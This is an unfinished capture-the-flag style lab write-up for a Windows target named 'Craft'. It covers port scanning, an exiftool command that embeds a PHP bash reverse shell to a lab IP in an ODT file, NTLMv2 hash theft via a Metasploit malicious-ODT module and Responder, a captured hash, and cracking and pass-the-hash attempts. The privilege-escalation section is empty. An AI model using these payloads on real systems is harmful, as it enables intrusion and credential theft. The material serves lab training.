---
description: 09-25-22
---

# Craft

### Improved skills

* Skill 1
* Skill 2

### Used tools

* Nmap -- NmapAutomator.sh

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

```

Enumerated UDP ports:

```
No UDP ports
```

Notes:

* We only have port 80 open

## Enumeration

### Port 80 - HTTP (Apache 2.4.48)

* Upload feature
* Attempted to upload .txt file and it did not work
* <mark style="color:yellow;">Please submit ODT file</mark>
* Submitted a test ODT file and it successfully submitted
* We know that the web app works as intended
* php is being used

### Exiftool Data Bypass

```
exiftool -DocumentName="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.49.143/80 0>&1'\"); ?>" test.odt
```

* This did not work
* Let's do some research on ODT file exploitation

### Research for ODT files

{% embed url="https://www.exploit-db.com/exploits/44564" %}

{% embed url="https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/" %}

{% embed url="https://www.rapid7.com/db/modules/auxiliary/fileformat/odt_badodt/" %}

## Exploitation

### NTLM Credential Theft via Malicious ODT File

* The Rapid7 ended up working (Had to use Metasploit)
* Generate the malicous ODT file via Metasploit (<mark style="color:yellow;">auxiliary/fileformat/odt\_badodt</mark>)
* Set LHOST to tun0
* Utilize Responder to intercept the NTLMv2 hash -- <mark style="color:yellow;">`sudo responder -I tun0 -d -w`</mark>
* Upload the generated ODT file to the web application via the file upload feature
* After a short while, you will receive an NTLMv2 hash

{% code overflow="wrap" %}
```
SMB] NTLMv2-SSP Username : CRAFT\thecybergeek
[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT:c969712d5a656b57:B8635DFD3A09FC77F4E868DBED8CA756:0101000000000000804FCD4305D1D801F335CD5A89373891000000000200080035004F003300480001001E00570049004E002D004B004B0054005A005800590059004D0059003700480004003400570049004E002D004B004B0054005A005800590059004D005900370048002E0035004F00330048002E004C004F00430041004C000300140035004F00330048002E004C004F00430041004C000500140035004F00330048002E004C004F00430041004C0007000800804FCD4305D1D80106000400020000000800300030000000000000000000000000300000F92A5F1D116E2202BBFABFF0EAA788C1A61086A45CA36DF4A94D8B9D7C4F6E000A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340039002E003100340033000000000000000000
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>NTLMv2 Hash Captured</p></figcaption></figure>

* Hashcat to crack password?

Hashcat:

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

* We utilize 5600 because that is the NTLMv2 hashcat format for NTLMv2
* Unfortunately, we end up exhausting our list and we cannot crack the password
* Do we have to relay the hash?
  * No, SMB is not open

Impacket wmiexec:

```
impacket-wmiexec CRAFT/thecybergeek@192.168.143.169 -hashes c969712d5a656b57:B8635DFD3A09FC77F4E868DBED8CA756

Timed out
```

* Unfortunately, this did not work
* So we are a little stuck at this point
* <mark style="color:yellow;">This is where we need to realize how do we leverage what we have?</mark>

### Research

{% embed url="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" %}

* We know that we have a hash, how can we use this against the target?
* The only thing that is really making this complicated is the fact that 80 HTTP is not open
* This is why I believe that our magic tool is going to be PTH-Curl

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
